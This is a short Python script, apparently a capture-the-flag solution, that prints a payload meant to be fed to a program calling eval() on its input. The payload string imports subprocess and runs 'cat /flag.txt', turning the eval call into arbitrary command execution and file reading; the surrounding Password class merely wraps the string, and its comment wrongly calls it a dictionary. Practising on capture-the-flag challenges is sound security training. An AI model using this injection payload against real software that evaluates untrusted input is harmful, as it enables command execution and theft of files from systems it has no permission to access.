import sys

# The string we want to pass to eval() to get the password
password_string = "__import__('subprocess').check_output(['cat', '/flag.txt'], universal_newlines=True)"

# We need to find a way to pass this string to the program without it being executed
# One way is to use a dictionary with a __str__ method that will return the string
class Password(object):
    def __init__(self, password):
        self.password = password
    def __str__(self):
        return self.password

# Create an instance of the Password class with the string we want to pass
password = Password(password_string)

# Print the password string to stdout
print(str(password), file=sys.stdout)